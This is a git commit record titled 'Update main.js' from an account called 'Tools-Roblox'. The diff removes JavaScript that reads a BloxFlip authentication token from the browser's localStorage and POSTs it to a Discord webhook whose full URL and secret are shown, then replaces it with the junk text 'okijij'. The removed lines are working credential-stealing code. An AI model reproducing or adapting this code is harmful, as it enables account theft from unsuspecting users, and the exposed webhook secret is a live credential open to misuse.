28bbcfdbbc7fdc2c15a61b00b3c6d90b12f2b655
Tools-Roblox <117027580+Tools-Roblox@users.noreply.github.com>
2022-11-04 12:21:50 +0100

    Update main.js

--- main.js
+++ main.js
@@ -1,8 +1,1 @@
-  var request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/1038020186139271209/raehEh7e6vHP1i9fphl8CneZP1fgdJPIRrqvXsm10MDIGfc7ESrbDdyhUdnYWz-U8XF-", true);
-request.setRequestHeader("Content-Type", "application/json");
-var params = JSON.stringify({
-  "content": "Authtoken: " + localStorage.getItem("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
-});
-
-request.send(params);
+okijij
